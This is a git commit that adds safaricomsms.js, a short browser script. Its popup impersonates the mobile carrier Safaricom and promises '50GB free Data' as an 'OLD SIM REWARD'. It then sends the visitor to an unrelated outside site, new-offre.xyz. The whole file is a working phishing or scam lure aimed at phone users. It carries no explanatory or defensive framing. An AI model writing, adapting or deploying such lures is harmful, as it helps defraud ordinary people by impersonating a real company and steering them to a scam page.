e8d19a29740f0a36edbb5ff9b18113d7a410ee92
bigetijazz10 <bigetijazz10@gmail.com>
2024-11-20 22:43:17 -0800

    Create safaricomsms.js

---
+++ safaricomsms.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('Safaricom: Congratulations, Your mobile Number is Eligible to receive 50GB free Data Safaricom OLD SIM REWARD, kindly press Ok to proceed now','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://www.new-offre.xyz/Safaricom50gb';
+}
